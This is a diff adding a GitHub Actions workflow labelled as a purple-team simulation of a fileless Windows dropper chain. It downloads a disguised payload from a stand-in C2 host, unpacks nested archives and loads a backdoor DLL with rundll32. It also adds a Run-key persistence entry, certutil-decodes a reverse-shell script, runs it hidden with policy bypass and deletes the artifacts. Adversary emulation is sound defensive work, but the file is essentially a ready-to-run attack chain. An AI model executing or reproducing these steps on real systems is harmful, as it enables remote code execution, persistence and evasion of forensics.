@@ -1,0 +1,42 @@
+name: PurpleTeam_Fileless_Dropper_Execution
+
+on:
+  workflow_dispatch:
+
+jobs:
+  simulate_lolbas_attack_chain:
+    runs-on: windows-latest
+
+    steps:
+    - name: Step 1 – Download Meme Payload (7z disguised)
+      run: |
+        curl -o C:\Users\Public\meme.mp4 http://attacker-c2.com/assets/meme.mp4
+
+    - name: Step 2 – Extract Embedded Dropper Payload
+      run: |
+        # Rename to legit archive name for double 7z layer
+        rename-item C:\Users\Public\meme.mp4 dropper.7z.7z
+        # Extract payloads (first pass)
+        7z x C:\Users\Public\dropper.7z.7z -oC:\Users\Public\stage1 -y
+        # Extract second layer
+        7z x C:\Users\Public\stage1\dropper.7z -oC:\Users\Public\stage2 -y
+
+    - name: Step 3 – Simulate PrintNightmare DLL Load
+      run: |
+        rundll32 C:\Users\Public\stage2\printnightmare_backdoor.dll,EntryPoint
+
+    - name: Step 4 – SpoolFool Persistence Chain
+      run: |
+        reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateService /t REG_SZ /d "rundll32 C:\Users\Public\stage2\spoolfool_lol.dll,Main" /f
+
+    - name: Step 5 – LOLBAS Certutil Fileless Loader (Simulated)
+      run: |
+        certutil -decode C:\Users\Public\stage2\encoded_rev.ps1.txt C:\Users\Public\decoded_rev.ps1
+        powershell -w hidden -nop -ep bypass -File C:\Users\Public\decoded_rev.ps1
+
+    - name: Step 6 – Cleanup Artifact Trail
+      run: |
+        Remove-Item -Path C:\Users\Public\*.mp4 -Force
+        Remove-Item -Path C:\Users\Public\*.7z* -Force
+        Remove-Item -Path C:\Users\Public\stage1 -Recurse -Force
+        Remove-Item -Path C:\Users\Public\stage2 -Recurse -Force
